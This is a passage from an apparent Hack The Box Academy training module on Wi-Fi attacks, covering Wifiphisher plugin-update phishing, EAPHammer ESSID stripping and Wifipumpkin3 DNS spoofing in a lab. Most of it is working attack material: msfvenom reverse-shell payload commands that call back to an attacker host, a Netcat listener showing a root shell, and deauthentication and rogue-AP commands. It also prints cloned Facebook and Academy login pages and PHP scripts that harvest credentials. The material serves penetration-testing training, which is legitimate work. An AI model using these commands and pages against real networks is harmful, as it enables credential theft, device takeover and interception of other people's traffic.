After the victim enters the valid credentials, Wifiphisher captures them and displays the details in the terminal log. The captive portal then shows a fake firmware upgrade progress page, deceiving the victim into believing that the router is undergoing an upgrade. This creates a convincing illusion of a legitimate process, further increasing the likelihood of the victim falling for the attack.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/net_004_.PNG)![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/net_005.PNG)

Before proceeding with the next attack, it's a good practice to reset the network interfaces to their normal state by running the following command:

```shell
sudo systemctl restart NetworkManager

```

This ensures that the Wi-Fi interfaces are properly restored and ready for further use, especially if any network management changes were made during the previous attack.

* * *

### 3\. Plugin Update Phishing

This attack involves setting up a fake plugin update page that hosts malware crafted by the attacker. When the victim downloads and installs the plugin from the phishing page, it unknowingly executes the malware, compromising the victim's system.

Tools like [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) can be used to generate malicious payloads for this attack. These payloads can be crafted to gain Remote Code Execution (RCE) in the victim's system once the plugin is downloaded and executed by the victim.

In the lab environment, where the target (client) is using a Linux OS, we can generate a payload for the reverse shell using msfvenom. The following command will create a malicious payload for Linux:

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

```

Additionally for targets using Windows OS, the corresponding command would be:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

```

Finally, we run the plugin update phishing scenario using the following command:

```shell
wifiphisher -aI wlan0 -eI wlan1 -p plugin_update  --payload-path /home/wifi/shell.elf -kN

Authorization required, but no authorization protocol specified
Authorization required, but no authorization protocol specified
[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2025-01-18 22:18
[+] Timezone detected. Setting channel range to 1-13
[+] Selecting wlan1 interface for the deauthentication attack
[+] Selecting wlan0 interface for creating the rogue Access Point
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:71:cd:a2
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:02:c3:8e
[*] Cleared leases, started DHCP, set up iptables
[+] Selecting Browser Plugin Update template
[*] Using /home/wifi/shell.elf as payload
[*] Starting the fake access point...
[*] Starting HTTP/HTTPS server at ports 8080, 443
[+] Show your support!
[+] Follow us: https://twitter.com/wifiphisher
[+] Like us: https://www.facebook.com/Wifiphisher
[+] Captured credentials:

```

Here's a breakdown of the command::

| Argument | Description |
| --- | --- |
| `-aI wlan0` | This specifies the interface (wlan0) that will host the rogue AP. |
| `-eI wlan1` | This specifies the interface (wlan1) that will perform the deauthentication and DOS attack. |
| `-p plugin_update ` | This selects the phishing scenario, in this case, a fake plugin update page. |
| `--payload-path /home/wifi/shell.elf` | This specifies the location of the malicious payload to deliver to the victim. |
| `-kN` | Prevents the attack from killing the NetworkManager, allowing you to maintain other network functionalities on the attacking machine. |

Once the target network is identified, we press `[Enter]` to select it.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/plug_000.PNG)

Once a victim connects to the rogue access point (AP), their device will appear in the "connected stations" list within the tool.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/plug_001.PNG)

The victim will see the fake plugin update page, which resembles a legitimate plugin update for their system. After they download and execute the malicious plugin, a reverse shell will be established, granting us the control over the victim's system.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/plug_002.PNG)

To listen for incoming connections, the attacker can use nc (Netcat) on the specified port. The command for listening would be:

```shell
nc -nvlp 4444

```

This command tells `Netcat` to listen on port 4444 for incoming connections. Once the victim executes the malicious plugin, the reverse shell will connect back to our attacker system, and we will gain access to the victim's device.

```shell
nc -nvlp 4444

Listening on 0.0.0.0 4444
Connection received on 10.0.0.23 44470
id
uid=0(root) gid=0(root) groups=0(root)

```


# Using EAPHammer

* * *

[EAPHammer](https://github.com/s0lst1c3/eaphammer) is a powerful tool widely used by penetration testers and red teamers to execute targeted Evil Twin attacks. It supports various Evil Twin attacks, including those targeting WPA, WPA2, WPA3 (via Loud Mana), OWE, and WPA-Enterprise networks, making it a versatile option for wireless network assessments.

![eaphammer](https://academy.hackthebox.com/storage/modules/291/eaphammer/007.PNG)

* * *

EAPHammer comes with a lot of features, such as :

- Steal RADIUS credentials from WPA-EAP and WPA2-EAP networks.
- Perform hostile portal attacks to steal AD creds and perform indirect wireless pivots
- Perform captive portal attacks
- Built-in Responder integration
- Support for Open networks and WPA-EAP/WPA2-EAP
- No manual configuration necessary for most attacks.
- Leverages latest version of hostapd (2.8)
- Support for evil twin and karma attacks
- Generate timed Powershell payloads for indirect wireless pivots
- Integrated HTTP server for Hostile Portal attacks
- Support for SSID cloaking
- Fast and automated PMKID attacks against PSK networks using hcxtools
- Password spraying across multiple usernames against a single ESSID

* * *

We can use the `-h` option with eaphammer to view all the available commands and their usage. This provides a quick reference for understanding the tool's functionality and supported options.

```shell
./eaphammer -h

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


usage: eaphammer [-h] [--cert-wizard [{create,import,interactive,list,dh}] | --list-templates | --create-template | --delete-template |
                 --bootstrap | --creds | --pmkid | --eap-spray | --hostile-portal | --captive-portal-server-only | --captive-portal]
                 [--debug] [--lhost LHOST] [-i INTERFACE] [-e ESSID] [-b BSSID] [-c CHANNEL] [--hw-mode HW_MODE]
                 [--cloaking {none,full,zeroes}] [--auth {open,wpa-psk,wpa-eap,owe,owe-transition,owe-psk}] [--pmf {disable,enable,require}]
                 [--karma] [--essid-stripping {\r,\n,\t,\x20}] [--mac-whitelist MAC_WHITELIST] [--mac-blacklist MAC_BLACKLIST]
                 [--ssid-whitelist SSID_WHITELIST] [--ssid-blacklist SSID_BLACKLIST] [--loud] [--known-beacons]
                 [--known-ssids-file KNOWN_SSIDS_FILE] [--known-ssids KNOWN_SSIDS [KNOWN_SSIDS ...]] [--channel-width MGhz]
                 [--wpa-passphrase WPA_PASSPHRASE] [--capture-wpa-handshakes {yes,no}] [--psk-capture-file PSK_CAPTURE_FILE]
                 [--auth-alg {shared,open,both}] [--wpa-version {1,2}] [--transition-bssid OWE_TRANSITION_BSSID]
                 [--transition-ssid OWE_TRANSITION_SSID] [--autocrack] [--negotiate {balanced,speed,weakest,gtc-downgrade,manual}]
                 [--remote-cracking-rig server:port] [--wordlist WORDLIST] [--name NAME] [--description DESCRIPTION] [--author AUTHOR]
                 [--add-download-form] [--dl-form-message DL_FORM_MESSAGE] [--lport LPORT] [--payload PAYLOAD]
                 [--portal-template PORTAL_USER_TEMPLATE] [--pivot] [-I iface_n [iface_n ...]] [--user-list USER_LIST] [--password PASSWORD]

```

* * *

As shown from the usage options above, `EAPHammer` supports a variety of attacks, including WPA/WPA2 Evil Twin, WPA handshake capture, OWE and WPA3 Evil Twin, WPA2 Enterprise Evil Twin, KARMA attack, and ESSID Stripping attacks. For detailed usage instructions on each of these attacks, you can refer to the [EAPHammer Wiki](https://github.com/s0lst1c3/eaphammer/wiki). In this section, we will focus on the `ESSID Stripping` (A Rogue AP that appears the same but is different) attack using EAPHammer and explore how it can be leveraged to exploit WPA-Enterprise networks.

* * *

### ESSID Stripping

Operating systems typically enforce security controls to prevent users from connecting to rogue access points (APs) with names identical to legitimate networks. These controls depend on the device verifying that the security measures such as certificates match those configured for the recognized network. As a result, a device will not connect to a rogue AP with the `same` network name if the rogue AP does not adhere to the expected security protocols.

AirEye’s research team, in collaboration with the Computer Science faculty at the Technion – Israel Institute of Technology, discovered a vulnerability called [SSID Stripping](https://aireye.tech/2021/09/13/the-ssid-stripping-vulnerability-when-you-dont-see-what-you-get/) (also known as ESSID Stripping). This flaw causes a network’s name (SSID) to appear differently in the device’s `List of Networks` compared to its actual network name. However, in the user interface (UI), the network name would appear identical to the legitimate one, making it difficult for users to detect the discrepancy. Unsuspecting users may unknowingly connect to an attacker-controlled network, mistaking it for a legitimate one.

The SSID Stripping vulnerability affects all major software platforms, including:

- Microsoft Windows
- Apple iOS and macOS
- Android
- Ubuntu

AirEye’s research team discovered that many special characters, particularly those categorized as non-printable `UTF-8` characters, are omitted from how network names (ESSIDs) are displayed. This omission can be exploited to bypass new security settings implemented on Wi-Fi clients, such as those in Microsoft systems.

* * *

#### Types of Errors Exploited:

- `Type 1 Errors – Display Prefix`: The displayed SSID only shows a prefix of the full network name, hiding the appended malicious elements.
- `Type 2 Errors – Character Omission`: Non-printable or special characters are omitted from the displayed SSID, leading to discrepancies between the actual and displayed network names.
- `Type 3 Errors – Display Overflow`: Long SSIDs can cause the display to truncate or overflow, concealing critical parts of the name that might alert users.

In this attack, the access point (AP) name appears identical to the legitimate network name for the user. However, Windows processes the full name, including the non-printable characters, and identifies it as a new network. As a result, when the client attempts to connect, it treats the AP as an unfamiliar network and prompts the user to enter credentials such as a username, password, or other authentication details, similar to how it handles first-time connections. This behavior creates an opportunity for attackers to capture sensitive credentials during the login process.

Following are the characters that can be used for this attack to create an AP:

| Character | Working | Description |
| --- | --- | --- |
| `\x20` | ✔ | Add a space, like a white space after ESSID |
| `\x00` | ✔ | For NULL after ESSID, it'll omit all characters after it |
| `\t` | ✔ | Add tab after ESSID |
| `\r` | ✔ | Add new line after ESSID |
| `\n` | ✔ | For a enter, similar to '\\r' after ESSID |

For example the SSID `HTB-Wireless\x00testing` will be displayed as: `HTB-Wireless` on the UI. The NULL character `\x00` causes all characters after it to be omitted in the client's view, making it appear as just `HTB-Wireless`. Similarly, the SSID `HTB-Wireless\x20Test` will be displayed as: `HTB-Wireless Test`. The space character `\x20` is displayed as a regular space, making the rogue AP with a space in its name.

When attacking a `Linux` environment, special characters such as `\t` (tab), `\x00` (null), and `\x20` (space) can be used in the rogue AP's SSID to make it appear identical to the legitimate AP in the user interface. These characters are either displayed as spaces or omitted entirely, tricking users into connecting to the rogue AP by making it indistinguishable from the real one.

![eaphammer](https://academy.hackthebox.com/storage/modules/291/eaphammer/004.PNG)

While `\n` (newline) and `\r` (carriage return) add a visible new line at the end of the SSID, they are not recommended for use in attacks targeting `Linux` clients. The visible line break can make the rogue AP's SSID appear suspicious to users, reducing the likelihood of successfully deceiving them.

![eaphammer](https://academy.hackthebox.com/storage/modules/291/eaphammer/005.PNG)

* * *

### Using EAPHammer

The ESSID Stripping attack can be performed using [eaphammer](https://github.com/s0lst1c3/eaphammer). It suports the following options:

- `\r` for a new line.
- `\t` for a tab.
- `\n` for a enter, like `\r`.
- `\x20` for a space, like adding a white space after the SSID option using quotes.

First, we need to create self-signed certificates that eaphammer will use to set up our fake access point. This can be done using the `--cert-wizard` command.

```shell
/opt/eaphammer/eaphammer --cert-wizard

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Please enter two letter country code for certs (i.e. US, FR)
: US
[*] Please enter state or province for certs (i.e. Ontario, New Jersey)
: California
[*] Please enter locale for certs (i.e. London, Hong Kong)
: San Fransisco
[*] Please enter organization for certs (i.e. Evil Corp)
: Hack The Box
[*] Please enter org unit for certs (i.e. Hooman Resource Says)
: HTB
[*] Please enter email for certs (i.e. [email protected])
: [email protected]
[*] Please enter common name (CN) for certs.
: HTB
[CW] Creating CA cert and key pair...
[CW] Complete!
[CW] Writing CA cert and key pair to disk...
[CW] New CA cert and private key written to: /opt/eaphammer/certs/ca/HTB.pem
[CW] Complete!
[CW] Creating server private key...
[CW] Complete!
[CW] Using server private key to create CSR...
[CW] Complete!
[CW] Creating server cert using CSR and signing it with CA key...
[CW] Complete!
[CW] Writing server cert and key pair to disk...
[CW] Complete!
[CW] Activating full certificate chain...
[CW] Complete!

```

Once our self-signed certificates are created, we can use the following command to start our fake access point. We’ll set the ESSID stripping option to `\x20`, which will create a rogue AP with an extra space at the end of the name. Alternatively, we can use `\x00` or `\t`, which will also create a rogue AP that appears similar in the UI.

```shell
/opt/eaphammer/eaphammer -i wlan1 --auth wpa-eap --essid HTB-Wireless --creds --negotiate balanced  --essid-stripping '\x20'

                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/

                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
sh: 1: iptables-save: not found
[*] Reticulating radio frequency splines...

[*] Using nmcli to tell NetworkManager not to manage wlan1...

100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan1 no longer controlled by NetworkManager.

[hostapd] AP starting...

Configuration file: /opt/eaphammer/tmp/hostapd-2025-01-22-12-26-39-56YEO8hvLzWOpB9SNdU5caV2VIqUkWUn.conf
rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Wireless "
wlan1: interface state COUNTRY_UPDATE->ENABLED
wlan1: AP-ENABLED

```

Once the AP is enabled, we can see it in the following screenshot. It will look identical to the legitimate AP.

![eaphammer](https://academy.hackthebox.com/storage/modules/291/eaphammer/006.PNG)

We can wait for clients to automatically connect to our rogue AP. If they don't connect, we can force them to disconnect using deauthentication packets with `aireplay-ng`.

```shell
aireplay-ng --deauth 5 -a 9A:6A:21:34:AD:72  wlan0mon

13:24:04  Waiting for beacon frame (BSSID: 54:8C:A0:E8:DF:B1) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
13:24:04  Sending DeAuth (code 7) to broadcast -- BSSID: [9A:6A:21:34:AD:72]
13:24:05  Sending DeAuth (code 7) to broadcast -- BSSID: [9A:6A:21:34:AD:72]
13:24:05  Sending DeAuth (code 7) to broadcast -- BSSID: [9A:6A:21:34:AD:72]
13:24:06  Sending DeAuth (code 7) to broadcast -- BSSID: [9A:6A:21:34:AD:72]
13:24:06  Sending DeAuth (code 7) to broadcast -- BSSID: [9A:6A:21:34:AD:72]

```

Once the client connects, we can capture their credentials in clear text if they are using a weak authentication method such as `GTC`. If they are using `MSCHAP`, we would obtain an NTLM hash. This hash can either be brute-forced using tools like `Hashcat` or relayed back to the legitimate AP to authenticate to it.

```shell
wlan1: STA 61:bd:89:a1:9e:1b IEEE 802.11: authenticated
wlan1: STA 61:bd:89:a1:9e:1b IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 61:bd:89:a1:9e:1b
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

GTC: Wed Jan 22 13:24:08 2025
	 username:	<SNIP>
	 password:	<SNIP>

```

This attack is particularly advantageous in `WPA-Enterprise` networks, where robust security mechanisms are in place. By exploiting `ESSID Stripping`, attackers can bypass controls that typically prevent devices from connecting to rogue APs with identical SSIDs. For a comprehensive guide on ESSID Stripping, check out this insightful blog post: [What is ESSID Stripping Exactly?](https://r4ulcl.com/posts/essid-stripping/#what-is-essid-stripping-exactly). It dives deep into the mechanics of this vulnerability, its impact, and how attackers can exploit it.


# MiTM Overview

* * *

A Man-in-the-Middle (MiTM) attack is a cybersecurity threat where an attacker secretly intercepts and relays communication between two unsuspecting parties who believe they are directly connected. By positioning themselves between the participants, the attacker impersonates both sides, gaining the ability to capture, monitor, and manipulate sensitive information without detection. This can occur in various scenarios, such as intercepting HTTP transactions between a client and server by splitting the original connection into two separate links. Acting as a proxy, the attacker can read, modify, or inject data, posing serious risks to data confidentiality and integrity.

An attacker can deploy a Rogue Access Point (AP) to trick victims into connecting to it. Once connected, the attacker gains a Man-in-the-Middle (MiTM) position, effectively routing all the victim's traffic through the rogue AP's gateway. This allows the attacker to intercept, monitor, and manipulate network traffic, posing significant risks to the victim's data privacy and security.

* * *

## How MiTM Works:

1. `Configure the routing` : The attacker configures the routing, along with setting up the DNS and DHCP servers for the fake access point. These services will assign IP addresses to connected clients and handle their network requests, ensuring seamless connectivity that mimics the legitimate access point.
2. `Set Up Rogue AP`: The attacker creates a fake Wi-Fi network with the same name (SSID) as a legitimate one, often using tools like wifipumpkin3, airbase-ng, or hostapd.
3. `Deauthentication Attack` (Optional): To force victims off the legitimate network, the attacker sends deauthentication packets using tools like aireplay-ng, prompting users to reconnect—often to the rogue AP.
4. `Victim Connection`: The victim unknowingly connects to the attacker's AP, thinking it's a trusted network.
5. `Traffic Interception`: The rogue AP captures all data exchanged between the victim and external services, enabling the attacker to monitor communications (e.g., browsing activity), steal sensitive data (e.g., login credentials) and inject malicious content (e.g., phishing pages).
6. `Captive Portal` (Optional): The attacker sets up a fake login page that appears when the victim connects to the rogue AP, tricking them into providing credentials.
7. `DNS Spoofing` or `SSL Stripping` (Optional): The attacker can redirect the victim to fake websites or downgrade secure connections to unencrypted ones.
8. `SSL Interception` (Optional): The attacker intercepts and decrypts secure HTTPS traffic. This is done by providing the victim with a self-signed certificate. If the client accepts the self-signed certificate, the attacker can decrypt the encrypted HTTPS traffic.

* * *

## Next Steps

In the following sections, we will delve into some of the most common and dangerous Man-in-the-Middle (MiTM) attacks that can be carried out using a rogue access point. These attacks include:

- `DNS Spoofing`: We will explore how an attacker can manipulate DNS responses to redirect a victim's traffic to malicious websites, even though the victim believes they are visiting legitimate sites. This technique is often used in phishing attacks to deceive users into entering sensitive information on counterfeit websites.
- `Phishing & Bypassing MFA using Evilginx`: This section will focus on how attackers can bypass multi-factor authentication (MFA) systems using Evilginx, a tool that acts as a reverse proxy to intercept and steal authentication tokens. This allows attackers to bypass MFA protections and gain unauthorized access to user accounts.
- `SSL Interception`: We will also cover SSL interception, where an attacker intercepts and decrypts secure HTTPS traffic. By acting as a man-in-the-middle, the attacker can decrypt encrypted communication between the victim and the legitimate server, gaining access to sensitive data.

* * *


# DNS Spoofing

* * *

DNS Spoofing using a rogue Access Point (AP) is a type of Man-in-the-Middle (MitM) attack where the attacker sets up a fake wireless access point that mimics a legitimate one. When clients connect to this rogue AP, the attacker manipulates DNS (Domain Name System) responses to redirect the client's internet traffic to malicious websites without their knowledge.

### How DNS Spoofing Works:

1. `Attacker Hosts Rogue AP`: The attacker sets up a fake access point (AP) that mimics a legitimate Wi-Fi network, tricking users into connecting.
2. `Control DNS Server`: Once connected, the attacker manipulates the DNS server to control how domain names are resolved, redirecting user traffic.
3. `Redirecting Traffic`: When users try to access legitimate websites, their requests are redirected to malicious websites crafted by the attacker.
4. `Malicious Outcomes`: An attacker can perform the following actions during a DNS spoofing attack:
   - Credential Theft: Redirect users to fake login pages to capture sensitive credentials.
   - Malware Injection: Serve malware or malicious scripts to connected clients.
   - Session Hijacking: Intercept user sessions to gain unauthorized access to online accounts.
   - Phishing Attacks: Redirect users to pages mimicking legitimate websites for information harvesting.
   - Surveillance: Monitor and log network traffic to capture sensitive data like financial transactions.
   - Denial of Service (DoS): Prevent users from accessing legitimate websites by redirecting requests.

* * *

## Phishing Page Configuration

In this section, we will explore different phishing pages and their configurations targeting `HTB Academy` and `Facebook`.

### Hack The Box Academy

For the DNS spoofing demonstration on `Hack The Box Academy`, there is a replica login page hosted at `/var/www/html` using an `Apache` server inside the lab environment. This page includes a malicious `index.php` file that processes user input.

```html
               <div class="p-2 mt-2">
                    <form class="form-horizontal" method="POST" action="/data.php">
                        <input type="hidden" name="_token" value="dLLTAsNEev8Lsnvedo0wsqk1KrRzfzMrjLkpE9IZ" autocomplete="off">                        <div class="form-group mb-4">
                            <label for="email" class="font-size-13 line-height-1">E-Mail</label>
                            <input type="email" class="custom-form-control " id="email" name="email" placeholder="" value="" required="" autocomplete="email" autofocus="">
                                                    </div>

                        <div class="form-group mb-4">
                            <label for="password" class="font-size-13 line-height-1">Password</label>
                            <input type="password" class="custom-form-control " id="password" name="password" placeholder="">
                                                    </div>

```

![dnsspoof](https://academy.hackthebox.com/storage/modules/291/dnsspoof/001.PNG)

When a victim enters their credentials on this page, the form redirects to a `data.php` script containing the following code:

```php
<?php

$handle = fopen("pass.htm", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;

?>

```

This script captures the submitted credentials and appends them to a file named `pass.htm`, storing the victim's input for later retrieval.

### Facebook

Similarly for the DNS spoofing demonstration on `facebook`, a [replica login page](https://github.com/seeratawan01/Facebook-Responsive-Phishing-Page?tab=readme-ov-file#facebook-responsive-phishing-page-2020) is hosted at `/var/www/html/facebook` using an `Apache` server inside the lab environment. This fake page includes a malicious `index.php` file that collects user input.

```html
<div class="content-form">
    <form action="data.php" method="POST">
        <input type="text" name="username" placeholder="Email address or phone number"
               pattern="[a-zA-Z0-9_]+(?:\.[A-Za-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?!([a-zA-Z0-9]*\.[a-zA-Z0-9]*\.[a-zA-Z0-9]*\.))(?:[A-Za-z0-9](?:[a-zA-Z0-9-]*[A-Za-z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?|.{8,}\d+"
               title="Enter correct Email address or phone number" required>
        <input type="password" name="userpassword" placeholder="Password"
               pattern=".{5,}" title="Five or more characters" required>
        <input type="submit" name="data" value="Log In">
    </form>
</div>

```

![dnsspoof](https://academy.hackthebox.com/storage/modules/291/dnsspoof/002.PNG)

When a victim enters their credentials, the form submits the data to a `data.php` script containing the following code:

```php
<?php
$handle = fopen("fbpass.htm", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>

```

Once submitted, the data.php script appends the captured credentials to a file named `fbpass.htm`, allowing the attacker to harvest sensitive information. In the next section we will demonstrate how DNS spoofing can be exploited to redirect victims to these realistic phishing pages, compromising their credentials.


# DNS Spoofing (Attack)

* * *

[Wifipumpkin3](https://github.com/P0cL4bs/wifipumpkin3) is a WiFi exploitation framework which helps deploy various access-point attacks. It packs numerous features, many of which have been seen employed by the `Hak5 WiFi Pineapple`, only more up-to-date.

It's compatible with any newer versions of Linux and, like many other tools explored in this module, it requires that you have a WiFi interface or adapter that supports `Access-Point (AP)` mode. A shortlist of these adapters can be found [here](https://elinux.org/RPi_USB_Wi-Fi_Adapters).

The Linux distribution used needs to also have the following prerequisite tools installed:

- `iptables` (current: iptables v1.6.1)
- `iw` (current: iw version 4.14)
- `net-tools` (current: version 1.60+)
- `wireless-tools` (current: version 30~pre9-12)
- `hostapd` (current: hostapd v2.6)

We will be using it to perform a DNS spoofing attack. Wifipumpkin3 is a powerful framework designed for conducting rogue access point attacks, making it an excellent tool for performing man-in-the-middle (MITM) attacks. By mounting a rogue access point, it can intercept and manipulate network traffic from connected clients. In this section, we will explore how to execute a DNS spoofing attack using Wifipumpkin3 after achieving a man-in-the-middle position.

![WiFiPumpkin3](https://academy.hackthebox.com/storage/modules/291/wifipumpkin3/002_.PNG)

* * *

WiFiPumpkin3 offers the following features:

- WiFi networks scanning
- Rogue access point attack
- Man-in-the-middle attack
- Deauthentication attack
- DNS monitoring service
- Rogue DNS Server
- Intercept, inspect, modify and replay web traffic
- Captive portal attack (captiveflask)
- Extra-captiveflask templates
- Credentials harvesting
- Phishkin3 (Support MFA phishing attack via captive portal)
- EvilQR3 (Support Phishing QR code attack)
- Transparent Proxies
- RestFulAPI

* * *

Once a victim connects to the rogue access point, `Wifipumpkin3` enables attackers to manipulate DNS responses. This means the attacker can redirect users to malicious websites instead of legitimate ones by responding with false DNS records. The goal is to deceive the victim into revealing sensitive information, downloading malware, or performing actions beneficial to the attacker.

For the lab demonstration, we’ll perform DNS spoofing on two sites, `academy.hackthebox.com` and `facebook.com`. Once a victim connects to our rogue access point, their DNS requests for these targets will be intercepted and redirected to our-controlled destinations.

* * *

## Performing the Attack

### Spoofing Single Domain

To initiate the attack, we will first spoof a single domain, targeting the `Hack The Box Academy` website.

We begin by enabling monitor mode on the `wlan0` interface using the `airmon-ng` tool. Once the interface is in monitor mode, `airodump-ng` is used to scan for the target network, allowing us to gather essential details such as the network's `BSSID`, `channel`, and `signal strength`.

```shell
airmon-ng start wlan0

```

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 0 s ][ 2025-01-20 21:04

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28   0       17        2    0   1   54   WPA2 TKIP   PSK  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  62:BD:99:A1:9E:1B  -29    0 - 5      0        1

```

Based on the output, we identify our target network as `HTB-Corp`. Next, we will use `Wifipumpkin3` to create a rogue access point with the same name, allowing us to intercept connections and perform the attack.

```shell
wifipumpkin3

Authorization required, but no authorization protocol specified
  _      ___ _____     ___                  __    _      ____
 | | /| / (_) __(_)___/ _ \__ ____ _  ___  / /__ (_)__  |_  /
 | |/ |/ / / _// /___/ ___/ // /  ' \/ _ \/  '_// / _ \_/_ <
 |__/|__/_/_/ /_/   /_/   \_,_/_/_/_/ .__/_/\_\/_/_//_/____/
                                   /_/
                                            codename: Gao
by: @mh4x0f - P0cL4bs Team | version: 1.1.7 main
[*] Session id: 470d1b0c-d770-11ef-9a1d-d2209f6784c7
wp3 >

```

After starting Wifipumpkin3, we configure the rogue access point running the following commands:

```shell
wp3 > set interface wlan1
wp3 > set ssid HTB-Corp
wp3 > set proxy noproxy
wp3 > ignore pydns_server

```

These commands set the wireless interface `wlan1` to host the access point, assign the SSID to `HTB-Corp`, disable the proxy by setting it to `noproxy`, and exclude the `pydns_server` since the attack focuses on DNS spoofing.

Next, we can run the `ap` command to view the current settings configured for our rogue AP, including the `BSSID`, `SSID`, `channel`, `interface`, `interface_net`, `status`, `security` and `hostapd_config`.

```shell
wp3 > ap

[*] Settings AccessPoint:
=========================

 bssid             | ssid         |   channel | interface   | interface_net   | status      | security   | hostapd_config
-------------------+--------------+-----------+-------------+-----------------+-------------+------------+------------------
 BC:F6:85:03:36:5B | HTB-Corp     |        11 | wlan1       | default         | not Running | false      | false

```

Next, we use the `show` command to display the available modules in Wifipumpkin3:

```shell
wp3 > show

[*] Available Modules:
======================

 Name                     | Description
--------------------------+-----------------------------------------------------
 misc.custom_captiveflask | Install custom captiveflask templates
 misc.extra_captiveflask  | Extra customs captiveflask templates
 spoof.dns_spoof          | Perform a dns spoof with accesspoint attack
 wifi.wifideauth          | Sends deauthentication packets to a wifi network AP
 wifi.wifiscan            | Scan WiFi networks and detect devices

```

We select the `spoof.dns_spoof` module for dns spoof attack. Once the `dns_spoof` module is selected, we configure it with the following commands:

```shell
wp3 > use spoof.dns_spoof
wp3 : dns_spoof > set domains academy.hackthebox.com
wp3 : dns_spoof > set redirectTo 10.0.0.1
wp3 : dns_spoof > start

[*] DnsSpoof attack
===================

[*] Redirect to: 10.0.0.1

[*] Targets:
============

[*] -> [academy.hackthebox.com]

```

In this configuration, the `academy.hackthebox.com` domain will be spoofed, and all DNS requests for this domain will be redirected to the IP address `10.0.0.1`, which is where our fake phishing page for academy is hosted. This enables us to carry out the DNS spoofing attack effectively.

After setting up the DNS spoofing configuration, we run the `back` command followed by `start` command to start the rogue access point and initiate the attack:

```shell
wp3 : dns_spoof > back
[*] module: dns_spoof running in background
[*] use jobs command displays the status of jobs started
wp3 > start
[+] enable forwarding in iptables...
[*] sharing internet connection with NAT...
[*] setting interface for sharing internet: eth0
[+] starting hostpad pid: [3878]
wp3 > [+] hostapd is running
[*] starting pydhcp_server
[*] starting pydns_server port: 53
[*] starting sniffkin3 port: [80, 8080]
[+] sniffkin3 -> kerberos   activated
[+] sniffkin3 -> httpCap    activated
[+] sniffkin3 -> ftp        activated
[+] sniffkin3 -> emails     activated
